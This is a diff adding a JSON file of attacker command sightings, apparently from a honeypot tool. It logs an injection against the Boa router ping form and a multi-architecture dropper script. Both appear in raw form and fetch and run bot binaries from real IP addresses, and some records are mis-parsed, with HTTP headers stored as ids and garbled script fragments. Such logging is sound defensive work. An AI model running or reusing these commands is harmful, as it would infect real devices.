@@ -1,0 +1,355 @@
+{
+  "schema": "oraculo.evidence.sightings.v1",
+  "sightings": [
+    {
+      "attacker_src_ip": "172.20.20.10",
+      "command_raw": "POST /boaform/adminformLogout//boaform/admin/formPing6 HTTP/1.1",
+      "command_raw_defanged": "POST /boaform/adminformLogout//boaform/admin/formPing6 HTTP/1[.]1",
+      "created_at": "2026-08-14 21:06:57.099845",
+      "download_url": "http://154.90.70.23/mips",
+      "id": "29",
+      "steps": [
+        {
+          "meaning": "observed command fragment",
+          "step": "POST /boaform/adminformLogout//boaform/admin/formPing6 HTTP/1[.]1"
+        }
+      ]
+    },
+    {
+      "attacker_src_ip": "",
+      "command_raw": "",
+      "command_raw_defanged": "",
+      "created_at": "",
+      "download_url": "",
+      "id": "Host: 190.179.183.147",
+      "steps": []
+    },
+    {
+      "attacker_src_ip": "",
+      "command_raw": "",
+      "command_raw_defanged": "",
+      "created_at": "",
+      "download_url": "",
+      "id": "Content-Length: 167",
+      "steps": []
+    },
+    {
+      "attacker_src_ip": "",
+      "command_raw": "",
+      "command_raw_defanged": "",
+      "created_at": "",
+      "download_url": "",
+      "id": "User-Agent: Mozilla/5.0",
+      "steps": []
+    },
+    {
+      "attacker_src_ip": "",
+      "command_raw": "",
+      "command_raw_defanged": "",
+      "created_at": "",
+      "download_url": "",
+      "id": "Connection: close",
+      "steps": []
+    },
+    {
+      "attacker_src_ip": "",
+      "command_raw": "",
+      "command_raw_defanged": "",
+      "created_at": "",
+      "download_url": "",
+      "id": "",
+      "steps": []
+    },
+    {
+      "attacker_src_ip": "",
+      "command_raw": "",
+      "command_raw_defanged": "",
+      "created_at": "",
+      "download_url": "",
+      "id": "pingAddr=`cd /tmp; wget http://154.90.70.23/mips; chmod 777 mips;./mips post`&wanif=65535&go= Ping&submit-url=/ping6.asp&postSecurityFlag=34430",
+      "steps": []
+    },
+    {
+      "attacker_src_ip": "102.208.240.251",
+      "command_raw": "wget -nc http://45.87.174.8/k.php?a=mips,99N97OK5FN9K9D75H -O ./upnpsetup",
+      "command_raw_defanged": "wget -nc hxxp://45[.]87[.]174[.]8/k[.]php?a=mips,99N97OK5FN9K9D75H -O [.]/upnpsetup",
+      "created_at": "2026-08-14 20:43:38.944711",
+      "download_url": "http://45.87.174.8/k.php?a=mips,99N97OK5FN9K9D75H",
+      "id": "11",
+      "steps": [
+        {
+          "meaning": "download payload or remote script",
+          "step": "wget -nc hxxp://45[.]87[.]174[.]8/k[.]php?a=mips,99N97OK5FN9K9D75H -O [.]/upnpsetup"
+        }
+      ]
+    },
+    {
+      "attacker_src_ip": "176.65.148.93",
+      "command_raw": "cd /tmp 2>/dev/null || cd /var/tmp 2>/dev/null || cd /dev/shm 2>#!/bin/sh; HOST=\"91.199.133.133:8080\"; BIN=/tmp/.n; /dev/null; ARCH=\"\"; CPUINFO=$(cat /proc/cpuinfo 2>/dev/null | head -20); case \"$CPUINFO\" in;     *mips*el*|*MIPS*el*|*mips*le*) ARCH=\"mipsel\" ;;;     *mips*|*MIPS*) ARCH=\"mips\" ;;;     *arm*|*ARM*);         if echo \"$CPUINFO\" | grep -q \"v7\"; then ARCH=\"armv7l\";         elif echo \"$CPUINFO\" | grep -q \"aarch64\\|armv8\\|arm64\"; then ARCH=\"arm\";         else ARCH=\"arm\"; fi ;;;     *x86_64*|*amd64*|*AMD64*) ARCH=\"x86_64\" ;;;     *i486*|*i586*|*i686*|*Intel*) ARCH=\"x86_64\" ;;;     *powerpc*|*ppc*|*PowerPC*) ARCH=\"powerpc\" ;;;     *);         UNAME=$(uname -m 2>/dev/null);         case \"$UNAME\" in;             mips) ARCH=\"mips\" ;;;             mipsel) ARCH=\"mipsel\" ;;;             arm*) ARCH=\"arm\" ;;;             aarch64) ARCH=\"arm\" ;;;             x86_64) ARCH=\"x86_64\" ;;;             i*86) ARCH=\"x86_64\" ;;;             *) ARCH=\"mips\" ;; # default fallback;         esac;         ;;; esac; case \"$ARCH\" in;     armv7l|armv5l|armv4l|arm) REAL_ARCH=\"arm\" ;;;     mips) REAL_ARCH=\"mips\" ;;;     mipsel) REAL_ARCH=\"mipsel\" ;;;     x86_64|i486) REAL_ARCH=\"x86_64\" ;;;     powerpc) REAL_ARCH=\"arm\" ;; # fallback to arm;     *) REAL_ARCH=\"mips\" ;;; (wget http://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null && chmod (curl -s http://$HOST/real_$REAL_ARCH -o $BIN 2>/dev/null && chm(busybox wget http://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null &(tftp -g -r real_$REAL_ARCH $HOST -l $BIN 2>/dev/null && chmod 7esac; 777 $BIN && $BIN) ||; od 777 $BIN && $BIN) ||; & chmod 777 $BIN && $BIN) ||; 77 $BIN && $BIN) ||; (exec 3<>/dev/tcp/91.199.133.133/8080 2>/dev/null && echo -e \"GET /real_$REAL_ARCH HTTP/1.0\\r\\nHost: 91.199.133.133\\r\\n\\r\\n\" >&3 && (read -r h; while read -r l && [ -n \"$l\" ]; do :; done; cat) <&3 > $BIN && chmod 777 $BIN && $BIN)",
+      "command_raw_defanged": "cd /tmp 2>/dev/null || cd /var/tmp 2>/dev/null || cd /dev/shm 2>#!/bin/sh; HOST=\"91[.]199[.]133[.]133:8080\"; BIN=/tmp/[.]n; /dev/null; ARCH=\"\"; CPUINFO=$(cat /proc/cpuinfo 2>/dev/null | head -20); case \"$CPUINFO\" in;     *mips*el*|*MIPS*el*|*mips*le*) ARCH=\"mipsel\" ;;;     *mips*|*MIPS*) ARCH=\"mips\" ;;;     *arm*|*ARM*);         if echo \"$CPUINFO\" | grep -q \"v7\"; then ARCH=\"armv7l\";         elif echo \"$CPUINFO\" | grep -q \"aarch64\\|armv8\\|arm64\"; then ARCH=\"arm\";         else ARCH=\"arm\"; fi ;;;     *x86_64*|*amd64*|*AMD64*) ARCH=\"x86_64\" ;;;     *i486*|*i586*|*i686*|*Intel*) ARCH=\"x86_64\" ;;;     *powerpc*|*ppc*|*PowerPC*) ARCH=\"powerpc\" ;;;     *);         UNAME=$(uname -m 2>/dev/null);         case \"$UNAME\" in;             mips) ARCH=\"mips\" ;;;             mipsel) ARCH=\"mipsel\" ;;;             arm*) ARCH=\"arm\" ;;;             aarch64) ARCH=\"arm\" ;;;             x86_64) ARCH=\"x86_64\" ;;;             i*86) ARCH=\"x86_64\" ;;;             *) ARCH=\"mips\" ;; # default fallback;         esac;         ;;; esac; case \"$ARCH\" in;     armv7l|armv5l|armv4l|arm) REAL_ARCH=\"arm\" ;;;     mips) REAL_ARCH=\"mips\" ;;;     mipsel) REAL_ARCH=\"mipsel\" ;;;     x86_64|i486) REAL_ARCH=\"x86_64\" ;;;     powerpc) REAL_ARCH=\"arm\" ;; # fallback to arm;     *) REAL_ARCH=\"mips\" ;;; (wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null && chmod (curl -s hxxp://$HOST/real_$REAL_ARCH -o $BIN 2>/dev/null && chm(busybox wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null &(tftp -g -r real_$REAL_ARCH $HOST -l $BIN 2>/dev/null && chmod 7esac; 777 $BIN && $BIN) ||; od 777 $BIN && $BIN) ||; & chmod 777 $BIN && $BIN) ||; 77 $BIN && $BIN) ||; (exec 3<>/dev/tcp/91[.]199[.]133[.]133/8080 2>/dev/null && echo -e \"GET /real_$REAL_ARCH HTTP/1[.]0\\r\\nHost: 91[.]199[.]133[.]133\\r\\n\\r\\n\" >&3 && (read -r h; while read -r l && [ -n \"$l\" ]; do :; done; cat) <&3 > $BIN && chmod 777 $BIN && $BIN)",
+      "created_at": "2026-08-14 20:43:22.129369",
+      "download_url": "http://$HOST/real_$REAL_ARCH",
+      "id": "6",
+      "steps": [
+        {
+          "meaning": "change working directory",
+          "step": "cd /tmp 2>/dev/null"
+        },
+        {
+          "meaning": "change working directory",
+          "step": "cd /var/tmp 2>/dev/null"
+        },
+        {
+          "meaning": "attempt execution",
+          "step": "cd /dev/shm 2>#!/bin/sh"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "HOST=\"91[.]199[.]133[.]133:8080\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "BIN=/tmp/[.]n"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "/dev/null"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "ARCH=\"\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "CPUINFO=$(cat /proc/cpuinfo 2>/dev/null | head -20)"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "case \"$CPUINFO\" in"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "*mips*el*|*MIPS*el*|*mips*le*) ARCH=\"mipsel\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "*mips*|*MIPS*) ARCH=\"mips\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "*arm*|*ARM*)"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "if echo \"$CPUINFO\" | grep -q \"v7\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "then ARCH=\"armv7l\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "elif echo \"$CPUINFO\" | grep -q \"aarch64\\|armv8\\|arm64\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "then ARCH=\"arm\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "else ARCH=\"arm\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "fi"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "*x86_64*|*amd64*|*AMD64*) ARCH=\"x86_64\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "*i486*|*i586*|*i686*|*Intel*) ARCH=\"x86_64\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "*powerpc*|*ppc*|*PowerPC*) ARCH=\"powerpc\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "*)"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "UNAME=$(uname -m 2>/dev/null)"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "case \"$UNAME\" in"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "mips) ARCH=\"mips\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "mipsel) ARCH=\"mipsel\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "arm*) ARCH=\"arm\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "aarch64) ARCH=\"arm\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "x86_64) ARCH=\"x86_64\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "i*86) ARCH=\"x86_64\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "*) ARCH=\"mips\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "# default fallback"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "esac"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "esac"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "case \"$ARCH\" in"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "armv7l|armv5l|armv4l|arm) REAL_ARCH=\"arm\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "mips) REAL_ARCH=\"mips\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "mipsel) REAL_ARCH=\"mipsel\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "x86_64|i486) REAL_ARCH=\"x86_64\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "powerpc) REAL_ARCH=\"arm\""
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "# fallback to arm"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "*) REAL_ARCH=\"mips\""
+        },
+        {
+          "meaning": "download payload or remote script",
+          "step": "(wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null"
+        },
+        {
+          "meaning": "download payload or remote script",
+          "step": "chmod (curl -s hxxp://$HOST/real_$REAL_ARCH -o $BIN 2>/dev/null"
+        },
+        {
+          "meaning": "download payload or remote script",
+          "step": "chm(busybox wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null &(tftp -g -r real_$REAL_ARCH $HOST -l $BIN 2>/dev/null"
+        },
+        {
+          "meaning": "change permissions to make file executable",
+          "step": "chmod 7esac"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "777 $BIN"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "$BIN)"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "od 777 $BIN"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "$BIN)"
+        },
+        {
+          "meaning": "change permissions to make file executable",
+          "step": "& chmod 777 $BIN"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "$BIN)"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "77 $BIN"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "$BIN)"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "(exec 3<>/dev/tcp/91[.]199[.]133[.]133/8080 2>/dev/null"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "echo -e \"GET /real_$REAL_ARCH HTTP/1[.]0\\r\\nHost: 91[.]199[.]133[.]133\\r\\n\\r\\n\" >&3"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "(read -r h"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "while read -r l"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "[ -n \"$l\" ]"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "do :"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "done"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "cat) <&3 > $BIN"
+        },
+        {
+          "meaning": "change permissions to make file executable",
+          "step": "chmod 777 $BIN"
+        },
+        {
+          "meaning": "observed command fragment",
+          "step": "$BIN)"
+        }
+      ]
+    }
+  ],
+  "sightings_count": 9,
+  "source": "metadata/command_trace.json"
+}
